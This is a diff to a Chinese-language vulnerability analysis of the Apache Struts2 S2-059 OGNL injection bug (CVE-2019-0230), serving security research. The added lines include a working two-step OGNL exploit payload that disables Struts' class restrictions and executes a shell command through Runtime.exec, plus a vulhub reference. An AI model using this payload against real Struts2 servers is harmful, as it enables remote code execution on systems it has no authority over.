@@ -43,6 +43,14 @@ Struts2 会对某些标签属性（比如`id`，其他属性有待寻找）的�
 
 可以说如果用了`id="%{xxx}"`这个写法的基本上都在劫难逃了。。
 
+补充 [exp](https://github.com/vulhub/vulhub/tree/master/struts2/s2-059)（需url编码，分两次请求）：
+
+```java
+%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}
+
+%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}
+```
+
 ## Debug
 
 参考链接中两位师傅的调试文章都不错，我就不再重复写了。在这里记录下漏洞的细节和一些思考。
@@ -93,10 +101,12 @@ Struts2 会对某些标签属性（比如`id`，其他属性有待寻找）的�
 
 5. 受影响的属性
 
-   虽然`org.apache.struts2.components.UIBean#evaluateParams`方法中有很多属性使用findString()来获取值。但是除了id可以解析两次ognl外（算上前面的setId解析了一次），这些属性都仅解析了一次。例如同时name和id属性都存在有漏洞的写法：`<s:textfield name="%{skillName}" label="skillName" id="%{skillName}"/>`，传入`skillName=%{11*11}`，最后id解析出来是121，而name则是`%{11*11}`。所以应该只有id了吧。。
+   虽然`org.apache.struts2.components.UIBean#evaluateParams`方法中有很多属性使用findString()来获取值。但是除了id可以解析两次ognl外（算上前面的setId解析了一次），这些属性都仅解析了一次。例如同时name和id属性都存在有漏洞的写法：`<s:textfield name="%{skillName}" label="skillName" id="%{skillName}"/>`，传入`skillName=%{11*11}`，最后id解析出来是121，而name则是`%{11*11}`。所以应该只有id了吧。。（这一点也与天融信实验室的文章观点一致）
 
 ## Reference
 
 - [S2-059](https://cwiki.apache.org/confluence/display/WW/S2-059)
 - [Struts2 S2-059 漏洞分析](https://mp.weixin.qq.com/s/VyLiLrUV0yakh_lzTBYGyQ)
 - [CVE-2019-0230 s2-059 漏洞分析](https://www.cnblogs.com/ph4nt0mer/p/13512599.html)
+- [Struts2 S2-059 远程代码执行漏洞(CVE-2019-0230)](https://github.com/vulhub/vulhub/tree/master/struts2/s2-059)
+
